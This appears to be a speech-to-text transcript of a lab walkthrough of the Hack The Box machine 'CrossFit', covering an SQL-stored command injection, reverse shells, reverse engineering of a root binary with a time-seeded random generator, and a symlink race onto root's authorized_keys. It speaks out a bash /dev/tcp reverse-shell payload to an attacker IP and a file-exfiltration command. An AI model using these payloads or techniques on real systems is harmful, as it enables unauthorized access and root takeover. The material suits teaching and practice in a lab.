is it update no it's insert into into id email i don't know if i put it in quotes values i think this is it uh test crossfit id so it's not insert into id insert into users there we go yeah this works so let's try basic manage action bash c bash dash i and i'm going to put these as double quotes because i want to use the single quote so bash dash i like that dev tcp 10 10 14 4 9 000 0 and 1 single quote single quote put a semicolon at the end and so that will um what we just did is we put a semicolon here to escape into running a command and then we put a semicolon here in case their script added anything here and it made our bash command invalid so that's why we put two semicolons and that looks good so nclvnp 9001 let's put that in put a message uh we have to go oh we are in messages okay and let's do select star from users and we have a command so when this command exits because it should probably clear the row then uh we know something screwed up but the command's still there and we got our shell as isaac so we can go back to our notes and go to hank uh let's see let's go into edit mode and then we can command injection works command injection to isaac uh creating a file with ftp adm account via ftp plus putting shell and database email column i'm just bringing a note here so i know what i did to get in and now we can do 45 dash isaac and we can copy this shell as is it is a ac yep shell is isaac awesome uh let's go see if we can create an ssh key real quick cd.sh i'm going to exit this let's do sh keygen dash f i'm going to call this isaac okay cat isaac dot pub x-clip selection clipboard then echo dash we don't need the dash n [Music] uh paste to authorized keys sage mod 600 authorized keys chmod 600 isaac sh-i isaac at 10 10 10 208 and we specify the key which is also isaac and we get in so let's create a new thing send this to three and we'll label this isaac so i know the logic here doesn't make sense because isaac is after hank but i cleared up this pane which freed up the number so that's why it went to three so now we're on the system as isaac and have a good shell let's just do some basic enumeration around isaac so i'm going to do groups isaac he's a member of staff ftp and admins i don't know what the staff group is that's new um hank was not a member of staff we can try pseudo-dash l pseudo is actually not found so sudo isn't installed on this computer um you can do like a ps ef and one of the weird things is we're not seeing any processes from other users like we don't even see a reverse shell from hank this is accomplished through just hiding pids it's part of linux hardening if we can't etsy fs tab we can see slash proc is mounted with hide pid equals two which is going to hide the processes of other users you can also look at at the m tab which is a list of active mounts fstab is at boot time m tab is active and we can see if we grab hide we have it also there so it is hiding pids um let's see shell is isaac let's do grap proc at c fs tab i'm going to paste this uh let's do psef there we go this is what i want copy uh pid of other user hidden bash paste there we go and i'm going to put a line break there so it's a bit more clear there we go so let's see let's figure out what that staff command is so find or not staff uh staff group dash staff dash let's see is it fine group staff dash ls and we'll hide errors so what we just did is um are just looking for files owned by staff i can do less dash capital s to put it a bit prettier so python and that's about it uh verifonts.uhuid selenium so this is probably doing some uh how the cross-site scripting piece works they're using the selenium which is like a way to hook firefox chrome whatever just various browsers and then navigate to pages it's like the python request module but just on steroids you're using the full browser so nothing too interesting by doing that we can say find slash dash user and see if he has anything uh his home directory isn't too interesting to me uh proc isn't too interesting is there anything after proc uh let's just do crap dash v proc and we want to also exclude cis so there isn't really anything interesting owned by isaac on this system so the next piece i would be is let's look for a user.txt find slash home uh dash name it's a dash name or dash dash name user.txt homehank user.txt okay so it was modified march 17th at 7 33 so we should look for files around this time going back to our find command we can just do find slash instead of dash name we can do dash newer mt 2000 i guess this is 2021 by 2020 stat this does this give it 2021. so let's see i don't keep going back to find i mean i can just type find space slash but newer mt 2021 03 let's do 12 and then exclamation point newer mt 2021-03 let's say 22 so we got five days before and after 10 days is a pretty big window to look at i always like adding dash ls to dev null last s okay so we have a lot of things in run march 17th is that today oh that is today shoot i was like why is this box having things of today um because of how hack the box does flag rotations so instead of that i'm going to do may 2020 okay that solves everything um yeah hack the box drops flags when the machine boots up so it would be today uh let's see this is between may 4th and may 9th so i think may is month number four this is gonna be one of those weird things where i don't know the orders of the the numbers of the month off top my head on the spot um month order of may may 5. sometimes i was thinking july was five so o5 um always helps to just google when you have a question and you know what i could have just added the file and got it in this date format and then not shown uh that silliness i can remember everything except for that i don't know why uh may let's do 14th okay so let's see we got user bin and on may 13th we got db message which is unique and we got a bunch of python stuff so what i'm going to do is we'll grab dash v python [Music] there we go so let's see firefox db messages sticking out but you can see everything they installed um let's narrow this window down actually i don't know if that'll help too much we may want to get rid of run so python run we got a bunch of user lib modules boot dev wait why is it going to march 18th oh i did 20 21. i was like things in dev shouldn't be showing up those are created new so the web page d package stuff pam stuff that db message that's interesting if i go to my box i don't have db message i have d message but not db message so i'm guessing that's like database message and that could be put on by something else so let's go into user bin and stat db message and that's unique i think this is usually put here because we see um well never mind we do see a bunch of zeros stat star grep modify okay so is a few files that don't have that um what was that printf command i did in a video before um so what i did there during that brief pause if you were keen enough to notice is i just paused it went to ipsec.rocks and then typed timestamp and talked about this um i get all the like names of time wrong like the units of measurement but this section of compromised is really good so we're going to do is do ls dash lt dash dash time style equals full iso and this shows all those time stamps like we did with the stat command so we can just grab v on all these zeros because the package manager is going to strip off anything after a second so in grub dash v and we do see a bunch of sim links so let's also hide those sim links so let's do this like that and the only file that comes left is db message um all these zeros is suspect so it went to i guess nanosecond and i'm guessing all these are probably because like maybe scp by default copies nanosecond and that's why that's there but these being zero is suspect so just another thing about timestamp forensics that you can use to find when files got there so now this file is really suspect because it's in user bin which is not where like you should drop files this is a package manager location this probably should have been in user local bin because this is where um i think users can drop files by default i don't know everything about linux off top of my head but in this directory this time stamp makes more sense because the user probably installed composer and it compiled and copied it to the folder so if db message was in user local bin it may have stuck out a little less because um right now this definitely doesn't belong because you look at this there are almost a thousand programs in here and this is the black sheep of the programs there's yet another way we could find db message if we used like process by so if we go into home and let's go um search process spy github it's just called pspy and we'll download the release so if we download release let's download 64 small save file and let's copy this real quick uh shoot i want to go user bin i just want to get a log file of this so copy so one isaac so we found it via this and also we did newer mt just logging the commands we were in and i guess where's db message we can copy this come on snip there we go great so this is modified files around let me put this find and um nano seconds on time stamp and user bin and then the next thing is going to be uh piece by so we downloaded that let's go in www cp downloads peace by python3-m http.server and let's go to dev uh let's see grab etsy fstab dev uh let's just do mount grep shm okay i just want to make sure it wasn't mounted with no exec because if it was we wouldn't be able to execute this program w get 10 10 14 4 at least out of the temp directory so we download pspy chmod plus x p spy um we probably want to do dash f to do file system events because again that hide pid thing is there to prevent us from seeing processes get executed but we can see when file systems get opened so if we just wait here for a little bit we'll probably see something along the lines of um what is it a db message opening so let's see go b i'm probably going to remove that banner so we do this go back here bash we do not need this banner snip and then we can snip again we go back here there's db message here dbms it is so grab paste um i don't really like this way of finding it because if this box was active it's gonna be really hard to find this i like finding the file through the above methods much much better so this is going to be piece by uh with file system events dash f okay so the next step to do would probably be download that db message so let's open up a new pane nc lvmp 9002 to db msg go back to isaac cp user bin db message to uh dev tcp 10 10 14 4 9 002 uh we just wanna catch let's see md five sum db message and md five sum uh user ben db message md6 i don't have that uh 35 and 35 so we are good so now we can begin reversing this db message application to see what it's all about so let's spin up ghidra so opt geeja ghidra run and it's going to load up the splash screen telling me well my version's probably out of date 2020 november 13th probably should update that i'm going to click this little dragon icon to open up the disassembly window i guess that's what it's called i don't know exactly what it's called but it opens up this and then i hit i and click on the program i want which is db message it's going to ask me is this the type of file format you want it's an elf yes that is click ok and then it's going to ask me if i want to run all the analysis and the answer is yes i want to run all the things so i select all and click analyze so now if you look at this bottom right it's going to show the analysis and it's already done we can look at the imports to see what libraries this program uses we have libsy that's no surprise lib crypto not really a surprise libmariadb it confirms that this is a database message probably because libmariadb is accessing mysql if you didn't know oracle bought mysql and then they um forked my sequel to mariadb to keep an open source version then you have lib zip so the next thing i like looking at is the exports and this doesn't look like it's stripped so we have all the like process names and everything which is super nice we just go to main to see how this program starts so we have get effective uid and this program must be run as root and then exit if it's not so must be root okay now we're doing something with time so this is getting the current time so current time is equal to this and it's calling it with null that's fine and then we're passing current time into s rand to generate the seed and this is kind of a insecure way to do a seed it's probably safe against like remote attacks but if someone's on the system and can see when this program was started they can guess what your seed is for random and then potentially break it so let's go and do comments set a pre comment um seed based upon time then we'll add the comment hit print screen and we will highlight this do a block and oh i want to copy the top right there okay so now let's uh send it to clipboard then go into our obsidian and then say 50 reverse engineering put it in the folder i'm sure there's a better way to do that re of db msg and then the very first thing is going to be s rand based upon time and this is a super common way i think i said that um if we go to google and let's say secure s rand seed uh proxy is refusing connections uh my burp suite is closed why do i have a proxy set uh edit let's go and edit this what is proxy so what happened here is i had to cut to do some work and i opened up a private window and set the proxy so uh yeah i recommend way to initialize srand let's see what um this says reading data from you random that's probably a good way because that's going to be random this one is saying hey let's use time the best way is just use time so yeah this one's using something with the clock so it's pretty common to see s rand uh setting using just the time as a seed and as we'll see we can potentially exploit this so the next thing it does after it sets the seed is go into process data and now we have a bunch of intimidating text but let's go through this and see if we can figure out exactly what it does so let's see my sequel in it so this is probably gonna be the mysql handle and i don't know if any of this terminology is gonna be correct i'm not a reverse engineer it's just kind of how i understand things so that failed uh now we get the connect and we have a hard-coded password so again uh it's not a big deal because we already knew this password but if this was like an actual engagement i would be highlighting it so we can do that and then also put it in a box and then copy it to clipboard go here hard-coded password and i think it's process data paste that image and if we look at how this looks we can see looks pretty good okay so the next thing uh this ivar 3. let's see i don't know what iver 3 is yet we'll just say mysql connect question mark so it connected maybe ivar 3 is um response so this may be error handle is what i'm going to call it so it's going to connect and if the error handle is equal to 0 exit with air maybe it's not error handle i don't know uh let's put a question mark here there we go and i just do the question mark so if i see it later in the program i know i wasn't positive about exactly what that was so this looks like it's going to be the query so this can be um messages table rows or we'll say rows messages table there we go so if there's uh let's see if rose message table is not equal to zero exit with error store results maybe this is a question mark and this is another error handle and this may be the results rows messages table 2 question mark so later i know which one is which because this one is storing the results so this is probably just did the command work and then this is that so we got zip open now so verb backup maria db comments zip so this is going to be zip open so this is zip i'm going to call it f zip so for filezip and then it does um file name this is probably the mode let's just google um what is it doing zip underscore open zip open and go to the documentation and let's see zip open path flags and error so this could be like an error handler and error p let's see if an error occurs and erp is not null be error code okay so maybe zip error question mark if i see that and later on i'll know this is the final handler for where zip goes like zip data and this could be the um error code we'll see exactly what it is so if zip is not equal to one or not equal to zero so i'm guessing if zip did not error it goes into here and it's doing my sql fetch rows on table two so this is probably going to be the data so rows table and this may be instead of question mark error okay so in the messages table now um let's see we don't know well 38 this could be row so maybe this is row i'll do a question mark as well so we'll say message underscore rail and then u of r is equal to rand so this is rnd s printf so let's see what this error handle question mark is this is probably my sequel row this should be message row right here um i think it reused a variable because i can't okay control z so this handle error it's saying this message row is equal to this so this is why i'm doing message row now this is going to be message rose i don't know following me in a debug is probably not something that is good for anyone's health so let's see right here this is going to be the output variable of this so this looks like it's going to be rnd plus message rail so and it's going to be limited to hex 30 bytes so 48 bytes so this is rnd plus message rail that's going to get the length so length of r d message row see this local f8 is probably going to be the output of md5 sum so md5 uh it's doing of let's see r d plus message row so i knew that was this because down here in this next s print f it said local f8 so based upon md5 sum it's saying it here that's why i thought that so md5 sum r d message rel okay so we're doing the same thing so local 98 this is going to be file path of 30 hex so 48 bytes again two strings this time before it was one digit one string so that's why it was you long here so we're combining these two strings rnd and message rail so maybe file path can be um for local rnd message row like that i don't know if that's helpful local 40 it's going to open this and then write the data so open whoa a local 40 is going to be f output so we kind of have an idea what's happening um at least i do so let's see can we easily show this let's go where is this select stuff messages this is a good spot so let's open up flame shot again and copy this if output file output let's go here okay so very first thing is going to be sql query and we can put text right here sql query and i can highlight this and ctrl shift wheel shift wheel up to make it bigger i don't know exactly how to move the text i'm sure there's a way we can change the color and things but it's not needed uh not publishing this blog post so it's who cares how clean it is just showing you what you can do so it does this it's going to open the zip open this one i don't think we really care about um then it's going to use this rand again and this one's darker because if you look in the top whatever when i do the scroll wheel it was just at a number other than zero when i started unfortunate but again it's a pain to clean up uh if i wasn't conscious of your time i'm wasting i'd clean them all up so this is going to be using random earlier srand initialized to time let's see using random maybe for file name yeah okay and then right here this file open whoops let's go down to zero so i can not block out text and here we can do text opening file based pawn earlier let's say insecure rnd so right now um hold on okay i want to include the f puts see sure sometimes boxing things is harder than you expect there we go then we can say writing to insecure location due to r d being known there we go so now we can copy and paste the exploit and then we look at this we have really nice ex uh annotations in a screenshot i should have made this one a bit bigger so we can grab the bottom of the row but oh well so now we have the exploit we have to um abuse random so we have to create a program that will let us generate our own random and what we're going to do is as long as we can write inver local which i think adm can um let's go to hank or isaac isaac here there we go if we go to vera lsla let's see local staff can write to local if we do a groups on isaac we're a member of staff so that is the important thing about his group we can write a sim link here so we know this program is going to attempt to write to ver local and then md5 sum rnd message rail and it's got to be a max of 48 characters so if it goes above 48 we gotta do some truncation but it's going to try to write to this file if we get ahead of the right and create a shortcut here and point like an ssh key to that random file then it won't create a new file it'll write to this file which is alias to root which this application must run as and we can write to roots ssh key so that is what we're going to be doing the very first step is to go here and we have to create our exploit so make dirapone then we go into pwn v ran dot c and we have to create a program so let's do all the standard definitions stdio.h then std lib.h and we want time because we're going to play with the time so int main void let's do it like that there we go and we can say time t is equal to the casting of the variable is time current time is equal to time null so that's just going to settle time and then we can create a seed so seed is going to be current time minus current time percent 60 which is going to be modulus 60 plus 61. so what this is going to do is get us to an even number minute so go to next minute plus one so what this 60 does is if we were at let's say um 116 and 41 seconds this percent 60 is going to get rid of it's going to come out to be 41 and they minus from that current time so we go straight to 116 and then we go ahead 61 seconds and i do 61 seconds because i'm assuming by the time the program gets to that file right it's going to be one second from when it's ran which we're just going to guess it's ran every minute right now um we could do like this in a loop and create a file for every second in a minute and definitely get it that way but um yeah that's the plan so now we're gonna do s rand on seed so now we just set our seed to this so now when we call random so print f uh percent d for digit rand we get what we want so we can return zero and exit so if i gcc dash o rand rand.c and we execute rand we get a number that's going to change every minute because we're only going up one second so we have that and the next thing we need is going to be um probably the shell we want to execute i'm guessing so message rail so as long as we did that piece correct that's good and this message row is this truncated to where's the truncation coming so s print to f rand plus message rail okay so this is 48 bytes so we're capped uh 48 here send this is let's see echo dash n wc-c 10 so i think we can have 38 characters that we need next and something's not striking me right uh let's go back to this and this select star this is actually selecting two things um it's probably got id and messages so one of these rows is wrong it's not grabbing both i'm guessing right here this is potentially going to grab the id column so let's say whoops row id s print there we go and this is message row or message id so i think this is it there we go clean that up um i should clean up screenshots but oh well um the trouble when you document as you go uh sometimes you make mistakes and have to redo documentation but on the plus side um if i didn't document that it may not strike me as odd so message id and we can control that so what that's going to be is if we go to isaac it doesn't really matter who we go to my sequel dash u crossfit dash p and we can go to our creds table so loot uh let's see creds crossfit grab this paste the password use crossfit and then show tables uh we can describe messages and this is where it's selecting from so it's got four potential things it could be and i think it executes out of message does it ever execute oh no it's not executing it's just writing so it writes something to message i believe where's put yeah so message rows one three two these are columns so uh zero one three two probably so what we can do is insert into messages and then say id doesn't really matter what we write we can put it into the name i guess values and we can say uh let's do 9001 and her private key or a public key so let's go back here cat uh let's do was it isaac.pub we'll just use this key so copy paste okay and we probably want to ssh as isaac so let's get two windows going ssh dash f was it here yeah ssh dash i isaac then isaac at 10 10 10 208 and we go cd ver is it local is that where it's writing is where our local staff it is so now we can do ln s and we'll want to combine what's in rand plus the date and first thing to do is make sure these machines are in sync 929 125 it is not so let's just copy the random binary over so dash i isaac isaac at 10 10 10 208 dev shm and we can do pwn rand so slash dev shm pwn chmod plus x dev shm not phone we called it rand what let's just copy it to 10 there we go temp brand we get a number awesome so what we want to do is get this number and then add 9001 to it and md5 summit so let's do date we're at 55 seconds so we want to do this it's got to be a minute so now we can run it again and we will grab this and say echo dash n this 9001 md5 sum and we can do ln s root ssh authorized keys to that link now we have it pointed there and when we put this in the database email doesn't have value um what insert into name let's say id email name doesn't have value say comma name message doesn't have value i guess we have to put everything in it uh data too long for email so let's put this is message and email what there we go uh select star from messages that looks fine hopefully that's fine uh if we do a date again we got 20 seconds left we can real quick potentially do echo because i'm not sure if it's got the line break or not so ln-s root sh authorized keys to this did i get it in time i did so one of those files oh it only created one of them shoot date well we can't cap the file because we don't have permission to that ssh key we're going to try sh-i isaac root at 10 10 10 208 and doesn't let us in it does not so we did that incorrectly if we select star from messages that's gone so we can write this and what we can do instead of sim linking is i think it's going to delete the file when it's done so uh that won't work so c9 c5 9 that's the one we did so i'm going to do this with alta dash n so we want to do dot slash rand or temp brand and then copy this i probably should have made the c program give me the whole file echo 9001 md5 sum ln dash is it s root ssh authorized keys on this date we got 30 seconds so i want to go back and look c59 yeah i'm pretty sure when i did this it overwrote so let's see if this works date five seconds left 57 9 okay it should be running and can we get in no so i'm going to take a step back and we're going to try this again dot slash slash temp rand did my temp director get written over looks like it did so um yeah that sucks we gotta copy that file back so let's go over here scp copy the file if i should copy towards home directory somewhere else because it gain delete is annoying let's just try echo dash n temp rand and let's put this in dollar like this 9001 awesome md5 sum that makes it easy so now we can go back to this insert command and what i want to do is let's change this so let's go in order which i think was name email message so let's get out of this oh my god uh there we go name email message is it msg or i think it's spelled out message and then we'll delete this whole key we probably should just reformatted this whole query because this is going to take a while i'm sure there's probably some hotkey i can use maybe ctrl d no we'll just delete it all but what i'm going to do is split up this ssh key in these parameters and we'll go back to geidra and look at the order it does it so we know where to put it so the name let's go back here um looks like probably name [Music] email message so we'll do here cat isaac.pub so the name's going to be sh-r-s-a uh we can do ipsec at parrot which is the end here i'm just putting these in parameters um shoot oh no we want to copy this key so copy this and paste okay that looks good so this md5 sum uh tempran doesn't exist anymore scp hawk print one there we go so now we have that we can look at the date how long do we have 20 seconds that's fine so do this use crossfit inserted and then we want to sim link this ln slash root slash dot sh authorized keys i probably just missed that window uh dash s date yeah i missed it by a few seconds so we can run this command again make sure this is in the database is it in twice probably not star from messages okay it's only at once so we have that ln s root ssh authorized keys to this file uh date we got 20 seconds left and as long as we got this working it'll be awesome but who knows if this will work and we can try ssh isaac root at 10 10 10 208 date two more seconds we should be good and we're in so that was it um if we wanted to what we can do now is cd slash root ssh um cat authorized keys i was going to see if we could see like our failed attempts if we did not concatenate it so we did let's say one two three i think no we just want two one two and we put this all in one line let's see what that looked like real quick so we did this and this did not work so were we just slow or did something weird happen so message name email and what i want to do where is my thing right here uh touch t okay that looks good let's run our command again and then copy ln s root sh t to that date please don't be okay we have like 30 seconds until this will execute so cat t and what i'm assuming is maybe there's just some weird like characters that are bad in this but we'll see date 45 so 15 seconds left cat t is still nothing 51 45 come on three more seconds 59 okay so did we write into t we did and what happened is it began with a space and that's probably what broke it um did a insert command begin with the space it didn't so uh what happened is the printf is putting a space between each of these strings and uh because it goes like name something email uh was it name no name email message so because it does that we put name as nothing so it begins the string with a space i believe or maybe this was a space a space got inserted at the beginning of the string which broke the format of an authorized key file so that's why we put our this to be um ssh-rsa so if we do comments pre i know there's a hotkey but we set this to be sh rsa and then we set this to be the name which was ipsec at parrot and then this one was the key i believe is how we did it comments p the key so i think that's exactly what we did and by setting each of these we didn't inject spaces which broke the formatting so hope you guys enjoyed that but before we get to the very end of the video um i want to go through and clean up our notes so we have one big nice file this loot page is mostly good there are two things i'd probably want to add to this the first are local users so we can do local accounts and then we go over to a shell we can cat etsy pass wd and maybe grep for um n's and sh oh sh dollar that's it and then we can awk print one like that and grab this uh dash f colon dash shaft is going to be field separator so we got three users on this box and just good information to have so with that i think my loot page is good this is what it looks like which is fine the next thing we have is common enumeration so let's check this this looks fine grab ssl banner ftp um that's fine buster we didn't really get anything sub domain via cores and subdomain found via ftp so here we may just want to add exactly what we did so upon an http header having a valid domain in the origin line it responds uh the response so let's see upon an http request header having a valid domain in the origin line the response header will have will contain this now we can put this in backtext so http request header origin line just putting emphasis on this response header so now since we have the emphasis when we look at it i think i like that we could also just make it bold or highlight but that's how i like it uh subdomain brute sub domain found via ftp uh we did this one by um xss so we can actually link this so we go link 25 dash gym club xss i think that's where we created it creating user yep that created a user upon logging in we upon logging in it looked like the user's home so look at that looks fine and we also have a link so i think i showed this before but in case i didn't you can see we have this linked which is pretty cool so common enumeration linked to cross-site scripting linked to ftp so it's a pretty cool like mind map type thing so we can go back to where we were so common numeration that's done let's go to web pages open this that's pretty much all we had so virtual host uh the ftp and or what we could do is go back in a log and take screenshots of like internal images so if we went to was it www firefox index.html and then we can take a screenshot of this to prove that we accessed an internal page so let's copy go over here and paste this this will be ftp dot crossfit dot htb this page was accessed via 25 gym club xss does not appear to be internet accessible so now when we look at that we have some notes that looks fine let's go to this gym club user inputs that looks fine and what i'm probably going to do is reorganize this a little bit and since we have things by fives this makes it easy so instead of web pages i'm going to label this gym club and we can put let's see actually web pages this is fine gym club crossfit trying to think of a good way to organize this because i want like the virtual host to be up front but i also want to go deep into each website so maybe this can be virtual host overview and we can say the other one was like was it developer test cat etsy hosts development task.crossfit.htb no data here or no page here but ftp adm can upload php shells to gain code execution okay that's fine so here we want gym club website and we'll do two flags for user inputs that's fine this will be gym club cross-site scripting attack detection initial poc browser that this one gets creating a user looks good so checking a browser didn't return a cookie but it did display we had javascript execution so i used the wii here and again like i don't like that but it did validate xss injection was possible then this use xml html request to return the page this is an account sure that's good this is pretty bad so we're going off of this so we created a user so we can do this we can probably do one with ftp let's see uploading a shell contents of hip.php and for this logged in with an ftp account created via that there we go dub dub dub to hank okay so we get shell as dub dub dub data limpese hank's password so this is showing us crontab has isaac running a script and we can link this to 45 isaac this is the one where we had found vulnerabilities running a script that has a vulnerability cron tab user logins that is fine so shell is hank c following is from that sure psp shell command has a bug what am i looking at here shell is hank ftp hosting and crossfit db so so this is things we just poked at command injection to isaac creating a file with ftp admin account via ftp plus putting a shell in the database email column so what i'm going to do is probably just remove these databases or we can put it above this shell is hank so we'll say credentials to databases and either ftp hosting no real juicy found in either that or crossfit databases okay then this will be php cron script and we can say this one is vulnerable so isaac runs send updates dot php every minute which is vulnerable to a command injection vulnerability if a file exists and was it ver something messages maybe ftp messages so it's volatile command injection vulnerability data in the email column of the users table within data within the email column can be used to execute code this is triggered only if a file exists there we go below is that and i'm going to say that is messaged her i'm not 100 positive that's messenger um maybe we'll confirm it later but yeah baseball shell command has a bug sure we can put that here so copy won't rule the command injection vulnerability due to an outdated library there we go and this will be mic heart l dash shell command okay that's good command injection we've already kind of explained that great file with ftp putting shell on database sure not perfect but we're good this i'm not super happy with it but we spend enough time making this report i don't waste too much time of yours so now we have all of this so let's go into htb where we called it obsidian hack the box crossfit and we can cat star to all dot md to all dot md so i go here we have one giant file and if we view this loot common grab you can see just one big pdf for this box we probably should have like an introduction and things like that so this is where we'd probably go to typora and put it into a template or if we didn't want to we could just go here and export to pdf page size letter shore export crossfit dot pdf and we could share it and again if you want to make this pretty this is where you'd use typora and import the mark down so it actually fits a template but yep uh right here's bad it didn't really do that header for some reason i need to put like an empty line break there but i hope you guys enjoyed this video take care and i will see you all next week